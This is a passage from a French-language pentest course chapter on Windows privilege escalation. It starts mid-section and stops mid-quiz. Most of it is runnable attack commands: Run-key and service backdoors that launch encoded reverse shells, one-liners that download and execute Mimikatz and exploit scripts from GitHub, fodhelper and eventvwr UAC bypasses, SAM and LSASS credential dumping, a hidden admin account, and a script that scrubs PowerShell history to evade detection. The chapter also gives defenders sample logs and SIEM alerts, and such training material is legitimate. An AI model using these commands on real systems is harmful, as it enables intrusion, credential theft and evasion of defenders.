   # Ajouter un programme malveillant à exécuter au démarrage
   reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\malicious.exe"
   ```

3. **Credentials dans le registre**
   - Informations d'identification stockées dans le registre
   
   ```powershell
   # Rechercher des mots de passe dans le registre
   reg query HKLM /f password /t REG_SZ /s
   reg query HKCU /f password /t REG_SZ /s
   
   # Vérifier les clés spécifiques connues pour stocker des informations d'identification
   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
   reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
   ```

#### Tâches planifiées vulnérables

1. **Tâches avec des binaires modifiables**
   - Tâches planifiées qui exécutent des binaires ou scripts modifiables par l'utilisateur actuel
   
   ```powershell
   # Lister les tâches planifiées
   schtasks /query /fo LIST /v
   
   # Vérifier les permissions sur les binaires exécutés
   # (Nécessite d'identifier manuellement les chemins des binaires)
   icacls "C:\path\to\scheduled\binary.exe"
   
   # Exploitation (si modifiable)
   copy C:\path\to\malicious.exe "C:\path\to\scheduled\binary.exe" /Y
   # Attendre l'exécution de la tâche planifiée
   ```

2. **Tâches avec des privilèges élevés**
   - Tâches exécutées par SYSTEM ou des utilisateurs privilégiés
   
   ```powershell
   # Identifier les tâches exécutées par SYSTEM
   schtasks /query /fo LIST /v | findstr /i "SYSTEM"
   
   # Vérifier si les tâches utilisent des fichiers modifiables
   # (Nécessite d'analyser manuellement les détails des tâches)
   ```

### Exploitation des vulnérabilités Windows

#### Vulnérabilités de correctifs manquants

1. **Identification des correctifs manquants**
   - Comparer la version du système et les correctifs installés avec les vulnérabilités connues
   
   ```powershell
   # Obtenir la liste des correctifs installés
   wmic qfe get Caption,Description,HotFixID,InstalledOn
   
   # Utiliser Sherlock pour identifier les vulnérabilités
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
   Find-AllVulns
   
   # Utiliser Watson (version plus récente de Sherlock)
   # (Nécessite de télécharger Watson.exe au préalable)
   .\Watson.exe
   ```

2. **Exploitation des vulnérabilités courantes**
   - Exemples de vulnérabilités Windows courantes pour l'élévation de privilèges
   
   ```powershell
   # MS16-032 (Secondary Logon Handle)
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1')
   Invoke-MS16032
   
   # CVE-2019-1388 (UAC Certificate Dialog)
   # (Exploitation manuelle via l'interface graphique)
   
   # PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
   # (Nécessite de télécharger l'exploit au préalable)
   ```

#### Techniques de contournement UAC (User Account Control)

1. **Principes de l'UAC**
   - Mécanisme de sécurité qui demande une élévation de privilèges pour les actions administratives
   - Plusieurs niveaux de contrôle, du plus strict au plus permissif

2. **Techniques de contournement courantes**
   - Méthodes pour contourner l'UAC sans invite
   
   ```powershell
   # Fodhelper UAC Bypass
   New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "cmd.exe" -Force
   New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "DelegateExecute" -Value "" -Force
   Start-Process "C:\Windows\System32\fodhelper.exe"
   
   # Eventvwr UAC Bypass
   New-Item -Path HKCU:\Software\Classes\mscfile\shell\open\command -Value "cmd.exe" -Force
   Start-Process "C:\Windows\System32\eventvwr.exe"
   
   # UACME (collection de techniques de contournement UAC)
   # (Nécessite de télécharger UACME au préalable)
   ```

3. **Exploitation avec PowerShell Empire ou Metasploit**
   - Modules intégrés pour le contournement UAC
   
   ```powershell
   # Exemple avec PowerShell Empire
   usemodule privesc/bypassuac_fodhelper
   
   # Exemple avec Metasploit
   use exploit/windows/local/bypassuac_fodhelper
   ```

#### Exploitation des applications vulnérables

1. **Applications avec des privilèges élevés**
   - Applications exécutées avec des privilèges SYSTEM ou administrateur
   - Vulnérabilités spécifiques aux applications (buffer overflow, DLL hijacking, etc.)
   
   ```powershell
   # Identifier les applications exécutées avec des privilèges élevés
   tasklist /v | findstr /i "system admin"
   
   # Rechercher des vulnérabilités connues pour ces applications
   # (Nécessite une recherche manuelle ou l'utilisation d'outils spécifiques)
   ```

2. **Exploitation des applications installées**
   - Applications tierces avec des vulnérabilités connues
   
   ```powershell
   # Lister les applications installées
   wmic product get name,version
   
   # Rechercher des vulnérabilités connues pour ces applications
   # (Nécessite une recherche manuelle ou l'utilisation d'outils spécifiques)
   ```

### Techniques post-exploitation

#### Extraction d'informations d'identification

1. **Extraction des hachages SAM**
   - Obtenir les hachages de mots de passe des utilisateurs locaux
   
   ```powershell
   # Avec privilèges administrateur, extraire SAM et SYSTEM
   reg save HKLM\SAM sam.hive
   reg save HKLM\SYSTEM system.hive
   
   # Utiliser Mimikatz pour extraire les hachages
   mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
   
   # Alternative avec PowerShell
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1')
   Get-PassHashes
   ```

2. **Extraction des mots de passe en mémoire**
   - Obtenir les mots de passe en clair depuis la mémoire LSASS
   
   ```powershell
   # Avec Mimikatz
   mimikatz # privilege::debug
   mimikatz # sekurlsa::logonpasswords
   
   # Alternative avec PowerShell
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
   Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
   ```

3. **Extraction des informations d'identification stockées**
   - Obtenir les mots de passe stockés dans Windows Credential Manager, navigateurs, etc.
   
   ```powershell
   # Windows Credential Manager
   cmdkey /list
   
   # Utiliser Mimikatz pour extraire les informations d'identification
   mimikatz # vault::cred
   
   # Alternative avec LaZagne (outil multiplateforme)
   # (Nécessite de télécharger LaZagne.exe au préalable)
   .\LaZagne.exe all
   ```

#### Persistance

1. **Création d'utilisateurs administrateurs**
   - Ajouter un nouvel utilisateur avec des privilèges administrateur
   
   ```powershell
   # Ajouter un utilisateur
   net user hacker Password123 /add
   
   # Ajouter l'utilisateur au groupe Administrateurs
   net localgroup Administrators hacker /add
   
   # Masquer l'utilisateur du login screen (optionnel)
   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker /t REG_DWORD /d 0
   ```

2. **Backdoors via services Windows**
   - Créer un service qui exécute une commande ou un programme malveillant
   
   ```powershell
   # Créer un service qui exécute un reverse shell
   sc create Backdoor binpath= "cmd.exe /c powershell -e <base64_encoded_reverse_shell>"
   sc config Backdoor start= auto
   sc start Backdoor
   
   # Alternative avec PowerShell
   New-Service -Name "Backdoor" -BinaryPathName "cmd.exe /c powershell -e <base64_encoded_reverse_shell>" -StartupType Automatic
   Start-Service -Name "Backdoor"
   ```

3. **Backdoors via tâches planifiées**
   - Créer une tâche planifiée qui exécute périodiquement une commande ou un programme malveillant
   
   ```powershell
   # Créer une tâche planifiée qui s'exécute toutes les heures
   schtasks /create /tn "WindowsUpdate" /tr "powershell -e <base64_encoded_reverse_shell>" /sc hourly /ru SYSTEM
   
   # Alternative avec PowerShell
   $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-e <base64_encoded_reverse_shell>"
   $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
   Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -User "SYSTEM"
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par l'énumération

1. **Logs d'exécution de commandes**
   - Utilisation intensive de commandes d'énumération (`systeminfo`, `whoami`, `net`, etc.)
   - Exécution de scripts d'énumération (PowerUp, WinPEAS, etc.)
   
   **Exemple de log (PowerShell) :**
   ```
   Log Name:      Windows PowerShell
   Source:        PowerShell
   Event ID:      400
   Task Category: Engine Lifecycle
   Level:         Information
   Keywords:      Classic
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   Engine state is changed from None to Available. 
   Details: 
   	NewEngineState=Available
   	PreviousEngineState=None
   	SequenceNumber=1
   	HostName=ConsoleHost
   	HostVersion=5.1.17763.1
   	HostId=ddcb7f0a-151e-4b5a-a496-9a6f3a7e9a8f
   	EngineVersion=5.1.17763.1
   	RunspaceId=6f25a8dd-5a3c-4f0f-b8c5-9b5d3e0cad4e
   	PipelineId=
   	CommandName=
   	CommandType=
   	ScriptName=
   	CommandPath=
   	CommandLine=
   ```

2. **Logs d'accès fichiers**
   - Accès à des fichiers de configuration sensibles
   - Tentatives de lecture de fichiers non autorisés
   
   **Exemple de log (Security) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4663
   Task Category: File System
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   An attempt was made to access an object.
   
   Subject:
   	Security ID:		DOMAIN\user
   	Account Name:		user
   	Account Domain:		DOMAIN
   	Logon ID:		0x12345
   
   Object:
   	Object Server:		Security
   	Object Type:		File
   	Object Name:		C:\Windows\System32\config\SAM
   	Handle ID:		0x0
   	Resource Attributes:	-
   
   Process Information:
   	Process ID:		0x123
   	Process Name:		C:\Windows\System32\cmd.exe
   
   Access Request Information:
   	Accesses:		ReadData (or ListDirectory)
   	Access Mask:		0x1
   ```

#### Traces générées par l'exploitation des configurations

1. **Logs de modification de service**
   - Création, modification ou démarrage de services
   - Changements de binaires de service
   
   **Exemple de log (System) :**
   ```
   Log Name:      System
   Source:        Service Control Manager
   Event ID:      7045
   Task Category: None
   Level:         Information
   Keywords:      Classic
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   A service was installed in the system.
   
   Service Name:  Backdoor
   Service File Name:  cmd.exe /c powershell -e <base64_encoded_reverse_shell>
   Service Type:  user mode service
   Service Start Type:  auto start
   Service Account:  LocalSystem
   ```

2. **Logs de modification du registre**
   - Modifications de clés de registre sensibles (Run, RunOnce, etc.)
   - Modifications liées au contournement UAC
   
   **Exemple de log (Security) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4657
   Task Category: Registry
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   A registry value was modified.
   
   Subject:
   	Security ID:		DOMAIN\user
   	Account Name:		user
   	Account Domain:		DOMAIN
   	Logon ID:		0x12345
   
   Object:
   	Object Name:		\REGISTRY\USER\S-1-5-21-1234567890-1234567890-1234567890-1001\Software\Classes\ms-settings\shell\open\command
   	Object Value Name:	(Default)
   	Handle ID:		0x0
   	Operation Type:		Set Value
   
   Process Information:
   	Process ID:		0x123
   	Process Name:		C:\Windows\System32\cmd.exe
   
   Change Information:
   	Old Value Type:		-
   	Old Value:		-
   	New Value Type:		REG_SZ
   	New Value:		cmd.exe
   ```

3. **Logs de création de tâches planifiées**
   - Création ou modification de tâches planifiées
   
   **Exemple de log (Security) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4698
   Task Category: Task Scheduler
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   A scheduled task was created.
   
   Subject:
   	Security ID:		DOMAIN\user
   	Account Name:		user
   	Account Domain:		DOMAIN
   	Logon ID:		0x12345
   
   Task Information:
   	Task Name:		\WindowsUpdate
   	Task Content:		<?xml version="1.0" encoding="UTF-16"?>
   <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
     <Triggers>
       <TimeTrigger>
         <Repetition>
           <Interval>PT1H</Interval>
           <Duration>P1D</Duration>
           <StopAtDurationEnd>false</StopAtDurationEnd>
         </Repetition>
         <StartBoundary>2023-05-15T14:23:45</StartBoundary>
         <Enabled>true</Enabled>
       </TimeTrigger>
     </Triggers>
     <Principals>
       <Principal id="Author">
         <UserId>S-1-5-18</UserId>
         <RunLevel>HighestAvailable</RunLevel>
       </Principal>
     </Principals>
     <Actions>
       <Exec>
         <Command>powershell.exe</Command>
         <Arguments>-e <base64_encoded_reverse_shell></Arguments>
       </Exec>
     </Actions>
   </Task>
   ```

#### Traces générées par l'exploitation des vulnérabilités

1. **Logs d'exécution de processus suspects**
   - Exécution d'exploits ou de binaires malveillants
   - Création de processus avec des privilèges élevés
   
   **Exemple de log (Security) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4688
   Task Category: Process Creation
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   A new process has been created.
   
   Subject:
   	Security ID:		DOMAIN\user
   	Account Name:		user
   	Account Domain:		DOMAIN
   	Logon ID:		0x12345
   
   Process Information:
   	New Process ID:		0x456
   	New Process Name:	C:\Users\user\Downloads\exploit.exe
   	Token Elevation Type:	TokenElevationTypeFull (2)
   	Mandatory Label:		Medium Mandatory Level
   	Creator Process ID:	0x123
   	Creator Process Name:	C:\Windows\System32\cmd.exe
   	Process Command Line:	exploit.exe
   ```

2. **Logs de contournement UAC**
   - Modifications du registre liées au contournement UAC
   - Exécution de processus système (fodhelper.exe, eventvwr.exe, etc.) suivie de processus avec des privilèges élevés
   
   **Exemple de log (Security) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4688
   Task Category: Process Creation
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   A new process has been created.
   
   Subject:
   	Security ID:		DOMAIN\user
   	Account Name:		user
   	Account Domain:		DOMAIN
   	Logon ID:		0x12345
   
   Process Information:
   	New Process ID:		0x456
   	New Process Name:	C:\Windows\System32\fodhelper.exe
   	Token Elevation Type:	TokenElevationTypeFull (2)
   	Mandatory Label:		Medium Mandatory Level
   	Creator Process ID:	0x123
   	Creator Process Name:	C:\Windows\System32\cmd.exe
   	Process Command Line:	fodhelper.exe
   ```

#### Traces générées par l'extraction d'informations d'identification

1. **Logs d'accès à LSASS**
   - Accès au processus LSASS (utilisé par Mimikatz)
   - Création de dumps mémoire
   
   **Exemple de log (Security) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4656
   Task Category: Object Access
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   A handle to an object was requested.
   
   Subject:
   	Security ID:		DOMAIN\user
   	Account Name:		user
   	Account Domain:		DOMAIN
   	Logon ID:		0x12345
   
   Object:
   	Object Server:		Security
   	Object Type:		Process
   	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
   	Handle ID:		0x0
   	Resource Attributes:	-
   
   Process Information:
   	Process ID:		0x123
   	Process Name:		C:\Windows\System32\cmd.exe
   
   Access Request Information:
   	Transaction ID:		{00000000-0000-0000-0000-000000000000}
   	Accesses:		PROCESS_VM_READ
   				PROCESS_QUERY_INFORMATION
   	Access Mask:		0x1010
   ```

2. **Logs d'extraction SAM**
   - Accès aux fichiers SAM et SYSTEM
   - Utilisation de commandes `reg save`
   
   **Exemple de log (Security) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4663
   Task Category: File System
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      WIN-SERVER
   Description:
   An attempt was made to access an object.
   
   Subject:
   	Security ID:		DOMAIN\user
   	Account Name:		user
   	Account Domain:		DOMAIN
   	Logon ID:		0x12345
   
   Object:
   	Object Server:		Security
   	Object Type:		File
   	Object Name:		C:\Windows\System32\config\SAM
   	Handle ID:		0x0
   	Resource Attributes:	-
   
   Process Information:
   	Process ID:		0x123
   	Process Name:		C:\Windows\System32\reg.exe
   
   Access Request Information:
   	Accesses:		ReadData (or ListDirectory)
   	Access Mask:		0x1
   ```

#### Alertes SIEM typiques

**Alerte d'énumération intensive :**
```
[ALERT] Suspicious System Enumeration Activity
Host: WIN-SERVER
User: DOMAIN\user
Time: 2023-05-15 14:23:45
Details: Multiple system enumeration commands executed in short time period (systeminfo, whoami, net user, etc.)
Severity: Medium
```

**Alerte de modification de service :**
```
[ALERT] Suspicious Service Creation or Modification
Host: WIN-SERVER
User: DOMAIN\user
Time: 2023-05-15 14:24:12
Details: New service created with suspicious command line or existing service binary path modified
Service: Backdoor
Command: cmd.exe /c powershell -e <base64_encoded_reverse_shell>
Severity: High
```

**Alerte de contournement UAC :**
```
[ALERT] Potential UAC Bypass Attempt
Host: WIN-SERVER
User: DOMAIN\user
Time: 2023-05-15 14:35:27
Details: Registry modifications associated with UAC bypass techniques detected, followed by execution of system binary (fodhelper.exe)
Severity: High
```

**Alerte d'accès à LSASS :**
```
[ALERT] Potential Credential Dumping
Host: WIN-SERVER
User: DOMAIN\user
Time: 2023-05-15 14:36:15
Details: Process attempting to access LSASS memory with suspicious access mask
Process: cmd.exe
Access Mask: 0x1010
Severity: Critical
```

**Alerte de création d'utilisateur administrateur :**
```
[ALERT] Suspicious Administrator Account Creation
Host: WIN-SERVER
User: DOMAIN\user
Time: 2023-05-15 14:40:05
Details: New user account created and added to Administrators group
New Account: hacker
Severity: Critical
```

### Pièges classiques et erreurs à éviter

#### Erreurs d'énumération

1. **Énumération incomplète**
   - Oubli de vérifier certains vecteurs (registre, tâches planifiées, etc.)
   - Utilisation d'un seul script d'énumération
   - Négligence des fichiers cachés ou des configurations spécifiques
   
   **Solution :** Utiliser plusieurs scripts d'énumération, effectuer des vérifications manuelles approfondies, adapter l'énumération au contexte.

2. **Trop de bruit**
   - Lancement de scans ou de recherches massives générant des logs excessifs
   - Utilisation d'outils bruyants sans précaution
   
   **Solution :** Cibler l'énumération, utiliser des options pour limiter le bruit, espacer les commandes.

#### Erreurs d'exploitation

1. **Mauvaise cible d'exploit**
   - Utilisation d'un exploit pour la mauvaise version de Windows
   - Tentative d'exploitation d'une configuration qui n'est pas réellement vulnérable
   
   **Solution :** Vérifier précisément la version de Windows et les correctifs installés, confirmer la vulnérabilité avant l'exploitation.

2. **Exploit instable ou malveillant**
   - Utilisation d'un exploit provoquant un crash
   - Téléchargement d'exploits depuis des sources non fiables
   
   **Solution :** Tester les exploits dans un environnement contrôlé, privilégier les exploits de sources reconnues.

3. **Oubli des protections**
   - Ignorance des protections comme Windows Defender, AppLocker, etc.
   - Négligence des protections du système (ASLR, DEP, etc.)
   
   **Solution :** Vérifier les mécanismes de sécurité en place, adapter les techniques d'exploitation.

#### Erreurs post-exploitation

1. **Nettoyage insuffisant**
   - Laisser des outils, scripts ou fichiers temporaires sur la cible
   - Ne pas effacer l'historique des commandes
   - Laisser des processus malveillants en cours d'exécution
   
   **Solution :** Mettre en place une routine de nettoyage systématique, utiliser des répertoires temporaires dédiés, effacer l'historique.

2. **Persistance trop évidente**
   - Ajout d'utilisateurs administrateurs avec des noms suspects
   - Création de services ou tâches planifiées avec des noms suspects
   - Installation de backdoors évidentes
   
   **Solution :** Utiliser des noms plausibles pour les utilisateurs, services et tâches, utiliser des techniques de persistance plus discrètes.

### OPSEC Tips : PrivEsc discrète

#### Techniques de base

1. **Limitation du bruit d'énumération**
   ```powershell
   # Préférer les recherches ciblées
   Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq "LocalSystem" -and $_.PathName -notlike "*system32*"}
   
   # Éviter les commandes bruyantes
   # Au lieu de: dir /s /b C:\ > all_files.txt
   # Préférer: dir /s /b C:\Users\user\Documents > user_docs.txt
   ```

2. **Utilisation d'outils intégrés**
   ```powershell
   # Utiliser PowerShell plutôt que des binaires externes
   # Au lieu de télécharger WinPEAS, utiliser des commandes PowerShell natives
   
   # Exemple: vérifier les services vulnérables
   Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike "*system32*"} | ForEach-Object {
       $path = $_.PathName.Trim('"')
       $path = $path.Split(" ")[0]
       $acl = Get-Acl $path -ErrorAction SilentlyContinue
       if ($acl -and $acl.Access | Where-Object {$_.IdentityReference -match $env:USERNAME -and $_.FileSystemRights -match "Modify"}) {
           Write-Host "Service vulnérable trouvé: " $_.Name
           Write-Host "Chemin: " $path
       }
   }
   ```

3. **Nettoyage immédiat**
   ```powershell
   # Supprimer les fichiers temporaires
   Remove-Item C:\Users\user\Downloads\exploit.exe
   
   # Effacer l'historique PowerShell
   Clear-History
   Remove-Item (Get-PSReadlineOption).HistorySavePath
   ```

#### Techniques avancées

1. **Exécution en mémoire**
   ```powershell
   # Télécharger et exécuter des scripts sans les écrire sur le disque
   IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
   
   # Utiliser des techniques d'injection de processus pour l'exécution
   # (Nécessite des scripts spécifiques)
   ```

2. **Modification minimale**
   ```powershell
   # Préférer l'exploitation de configurations existantes aux modifications
   # Exemple: Abuser d'un service vulnérable plutôt que d'en créer un nouveau
   
   # Utiliser des techniques de persistance temporaires
   # Exemple: Utiliser WMI Event Subscription plutôt que des tâches planifiées
   ```

3. **Masquage des processus et connexions**
   ```powershell
   # Utiliser des processus légitimes pour l'exécution
   # Exemple: Utiliser PowerShell avec des paramètres de masquage
   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "..."
   
   # Utiliser des techniques de tunneling pour masquer le trafic réseau
   # Exemple: Tunneling DNS, ICMP, etc.
   ```

#### Script OPSEC : Énumération discrète

```powershell
# Script d'énumération Windows discrète avec considérations OPSEC

# Configuration
$LogFile = "C:\Users\$env:USERNAME\AppData\Local\Temp\enum_$(Get-Date -Format 'yyyyMMddHHmmss').log"
$ErrorLog = "C:\Users\$env:USERNAME\AppData\Local\Temp\enum_error.log"
$MaxDepth = 2

# Fonction de logging
function Write-Log {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] [$Level] $Message"
    
    # Logging local uniquement (pas de télémétrie)
    Add-Content -Path $LogFile -Value $LogEntry
    
    # Affichage console avec code couleur
    switch ($Level) {
        "INFO" { Write-Host $LogEntry -ForegroundColor Cyan }
        "SUCCESS" { Write-Host $LogEntry -ForegroundColor Green }
        "WARNING" { Write-Host $LogEntry -ForegroundColor Yellow }
        "ERROR" { Write-Host $LogEntry -ForegroundColor Red }
        default { Write-Host $LogEntry }
    }
}

# Fonction pour introduire un délai aléatoire
function Invoke-RandomDelay {
    $Delay = Get-Random -Minimum 1 -Maximum 3
    Write-Log "Waiting for $Delay seconds..." -Level "INFO"
    Start-Sleep -Seconds $Delay
}

# Fonction pour vérifier si l'utilisateur a des privilèges administrateur
function Test-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Fonction pour nettoyer les traces
function Invoke-Cleanup {
    Write-Log "Cleaning up traces..." -Level "INFO"
    
    # Effacer l'historique PowerShell
    try {
        Clear-History -ErrorAction SilentlyContinue
        $HistoryPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $HistoryPath) {
            $History = Get-Content $HistoryPath
            $CleanHistory = $History | Where-Object { 
                -not ($_ -match "enum" -or $_ -match "privesc" -or $_ -match "exploit" -or $_ -match "vulnerability") 
            }
            Set-Content $HistoryPath $CleanHistory
            Write-Log "PowerShell history cleaned" -Level "SUCCESS"
        }
    } catch {
        Write-Log "Error cleaning PowerShell history: $_" -Level "ERROR"
    }
}

Write-Log "Starting discrete Windows enumeration" -Level "INFO"

# --- Informations système --- 
Write-Log "Gathering basic system info..." -Level "INFO"
Write-Log "--- WHOAMI ---" -Level "INFO"
whoami
Invoke-RandomDelay

Write-Log "--- SYSTEM INFO ---" -Level "INFO"
$OSInfo = Get-WmiObject -Class Win32_OperatingSystem
"OS: $($OSInfo.Caption) $($OSInfo.OSArchitecture)"
"Version: $($OSInfo.Version)"
"BuildNumber: $($OSInfo.BuildNumber)"
Invoke-RandomDelay

Write-Log "--- HOTFIXES ---" -Level "INFO"
Get-HotFix | Select-Object HotFixID, InstalledOn | Sort-Object InstalledOn -Descending | Select-Object -First 10
Invoke-RandomDelay

Write-Log "--- USER PRIVILEGES ---" -Level "INFO"
whoami /priv
Invoke-RandomDelay

# --- Recherche de configurations vulnérables --- 
Write-Log "Checking for vulnerable configurations..." -Level "INFO"

Write-Log "--- SERVICES WITH UNQUOTED PATHS ---" -Level "INFO"
$UnquotedServices = Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -ne $null -and 
    $_.PathName -notlike '"*"' -and 
    $_.PathName -like "* *"
}
if ($UnquotedServices) {
    $UnquotedServices | ForEach-Object {
        "Service: $($_.Name)"
        "DisplayName: $($_.DisplayName)"
        "Path: $($_.PathName)"
        "StartMode: $($_.StartMode)"
        "---"
    }
} else {
    "No services with unquoted paths found."
}
Invoke-RandomDelay

Write-Log "--- SERVICES WITH MODIFIABLE BINARIES ---" -Level "INFO"
$ModifiableServices = Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -ne $null -and 
    $_.PathName -notlike "*system32*"
}
if ($ModifiableServices) {
    foreach ($service in $ModifiableServices) {
        $path = $service.PathName.Trim('"')
        $path = $path.Split(" ")[0]
        try {
            $acl = Get-Acl $path -ErrorAction Stop
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $hasModifyRights = $acl.Access | Where-Object {
                $_.IdentityReference.Value -eq $currentUser -and 
                ($_.FileSystemRights -match "Modify" -or $_.FileSystemRights -match "FullControl")
            }
            if ($hasModifyRights) {
                "Service: $($service.Name)"
                "DisplayName: $($service.DisplayName)"
                "Path: $path"
                "StartMode: $($service.StartMode)"
                "---"
            }
        } catch {
            # Silently continue
        }
    }
} else {
    "No services with potentially modifiable binaries found."
}
Invoke-RandomDelay

Write-Log "--- SCHEDULED TASKS ---" -Level "INFO"
$Tasks = Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object -First 10
foreach ($task in $Tasks) {
    "Task: $($task.TaskName)"
    "Path: $($task.TaskPath)"
    "State: $($task.State)"
    try {
        $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction Stop
        "Last Run Time: $($taskInfo.LastRunTime)"
        "Next Run Time: $($taskInfo.NextRunTime)"
    } catch {
        "Could not get task info"
    }
    "---"
}
Invoke-RandomDelay

Write-Log "--- REGISTRY AUTORUN ---" -Level "INFO"
"HKLM Run:"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue | 
    ForEach-Object { $_.PSObject.Properties } | 
    Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSProvider" } | 
    ForEach-Object { "$($_.Name): $($_.Value)" }

"HKCU Run:"
Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue | 
    ForEach-Object { $_.PSObject.Properties } | 
    Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSProvider" } | 
    ForEach-Object { "$($_.Name): $($_.Value)" }
Invoke-RandomDelay

Write-Log "--- ALWAYSINSTALLELEVATED CHECK ---" -Level "INFO"
$HKLM_AIE = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
$HKCU_AIE = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue

if ($HKLM_AIE -and $HKCU_AIE -and $HKLM_AIE.AlwaysInstallElevated -eq 1 -and $HKCU_AIE.AlwaysInstallElevated -eq 1) {
    Write-Log "AlwaysInstallElevated is enabled! Potential privilege escalation vector." -Level "SUCCESS"
} else {
    "AlwaysInstallElevated is not enabled."
}
Invoke-RandomDelay

Write-Log "Discrete enumeration finished. Check logs: $LogFile and $ErrorLog" -Level "INFO"

# Nettoyage
Invoke-Cleanup

Write-Log "Enumeration complete." -Level "SUCCESS"
```

### Points clés

- L'élévation de privilèges Windows commence par une énumération système approfondie.
- Les configurations incorrectes courantes incluent les services mal configurés, les chemins non cités, et les tâches planifiées vulnérables.
- Les privilèges utilisateur spéciaux (SeImpersonate, SeBackup, etc.) peuvent être exploités pour obtenir des privilèges plus élevés.
- Les vulnérabilités de correctifs manquants et les techniques de contournement UAC sont des vecteurs d'élévation de privilèges courants.
- L'extraction d'informations d'identification (hachages SAM, mots de passe en mémoire) permet d'accéder à d'autres systèmes ou de maintenir l'accès.
- Les équipes défensives peuvent détecter la PrivEsc via les logs d'exécution, de modification de service, de registre, et d'accès à LSASS.
- Une approche discrète implique de limiter le bruit, d'utiliser des outils intégrés, de privilégier l'exécution en mémoire et de nettoyer les traces.

### Mini-quiz (3 QCM)

1. **Quel privilège Windows permet à un utilisateur d'usurper l'identité d'autres utilisateurs et est souvent exploité via des techniques comme Potato ?**
   - A) SeBackupPrivilege
   - B) SeImpersonatePrivilege
   - C) SeTakeOwnershipPrivilege
   - D) SeDebugPrivilege

   *Réponse : B*

2. **Quelle vulnérabilité de configuration de service Windows permet d'exploiter des espaces dans les chemins d'exécution ?**
   - A) DLL Hijacking
   - B) Service Binary Replacement
   - C) Unquoted Service Path
   - D) AlwaysInstallElevated

   *Réponse : C*

3. **Quelle technique permet de contourner l'UAC en exploitant des binaires Windows qui s'exécutent automatiquement avec des privilèges élevés ?**
   - A) Token Impersonation
   - B) DLL Hijacking
